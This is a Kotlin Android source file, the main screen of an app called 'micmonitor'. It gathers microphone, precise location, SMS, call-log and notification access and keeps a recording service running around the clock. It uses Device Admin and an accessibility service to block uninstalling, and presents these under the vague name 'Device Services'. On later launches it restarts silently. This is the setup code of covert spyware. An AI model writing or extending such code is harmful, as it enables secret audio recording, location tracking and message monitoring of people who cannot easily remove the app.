package com.micmonitor.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val prefs by lazy {
        getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
    }
    private val dpm by lazy { getSystemService(DevicePolicyManager::class.java) }
    private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }

    // All permissions needed
    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            return perms.toTypedArray()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Already set up — restart service silently; re-check protection features
        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
            launchService()
            requestBatteryOptExemption()
            when {
                !dpm.isAdminActive(adminComponent)   -> requestDeviceAdmin()
                !isAccessibilityServiceEnabled()     -> guideAccessibility()
                !isNotificationListenerEnabled()     -> guideNotificationAccess()
                else                                 -> finish()
            }
            return
        }

        setContentView(R.layout.activity_main)

        val btnGrant = findViewById<Button>(R.id.btnGrant)
        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        btnGrant.setOnClickListener {
            tvStatus.text = "Requesting permissions..."
            ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
        }
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE) {
            val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
            val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED

            if (micGranted) {
                prefs.edit().putBoolean("consent_given", true).apply()
                launchService()
                requestBatteryOptExemption()
                requestDeviceAdmin()  // start protection setup on first run
            } else {
                Toast.makeText(
                    this,
                    "Microphone permission is required. Please tap Grant again.",
                    Toast.LENGTH_LONG
                ).show()
                findViewById<TextView>(R.id.tvStatus).text =
                    "Microphone permission denied. Please allow it."
            }
        }
    }

    /** Step 1: activate Device Admin (disables Uninstall button in App Info) */
    private fun requestDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Prevents unauthorized uninstallation of this app."
                )
            }
            @Suppress("DEPRECATION")
            startActivityForResult(intent, RC_DEVICE_ADMIN)
        } else {
            guideAccessibility()
        }
    }

    /** Step 2: after device admin result, guide user to enable Accessibility Service */
    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_DEVICE_ADMIN) {
            guideAccessibility()
        }
    }

    private fun guideAccessibility() {
        if (!isAccessibilityServiceEnabled()) {
            AlertDialog.Builder(this)
                .setTitle("Enable Uninstall Protection")
                .setMessage(
                    "To block unauthorized uninstalls, enable 'Device Services' in:\n\n" +
                    "Settings → Accessibility → Installed Services → Device Services\n\n" +
                    "Tap 'Open Settings', find 'Device Services' and turn it ON."
                )
                .setCancelable(false)
                .setPositiveButton("Open Settings") { _, _ ->
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    finish()
                }
                .setNegativeButton("Skip") { _, _ -> guideNotificationAccess() }
                .show()
        } else {
            guideNotificationAccess()
        }
    }

    private fun guideNotificationAccess() {
        if (!isNotificationListenerEnabled()) {
            AlertDialog.Builder(this)
                .setTitle("Enable Notification Access")
                .setMessage(
                    "To read notifications, enable 'Device Services' in:\n\n" +
                    "Settings → Notifications → Notification Access → Device Services\n\n" +
                    "Tap 'Open Settings' and turn it ON."
                )
                .setCancelable(false)
                .setPositiveButton("Open Settings") { _, _ ->
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                    finish()
                }
                .setNegativeButton("Skip") { _, _ -> finish() }
                .show()
        } else {
            finish()
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        val target = "$packageName/${NotifListenerService::class.java.name}"
        return flat.split(":").any { it.equals(target, ignoreCase = true) }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val target = "$packageName/${UninstallGuardService::class.java.name}"
        return flat.split(":").any { it.equals(target, ignoreCase = true) }
    }

    private fun launchService() {
        val intent = Intent(this, MicService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    /** Asks Android to exempt this app from battery optimization so service runs 24/7 */
    @SuppressLint("BatteryLife")
    private fun requestBatteryOptExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(
                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                            .setData(Uri.parse("package:$packageName"))
                    )
                } catch (_: Exception) {
                    // Settings screen unavailable on some devices; skip silently
                }
            }
        }
    }

    companion object {
        private const val REQUEST_CODE = 1001
        private const val RC_DEVICE_ADMIN = 1002
    }
}

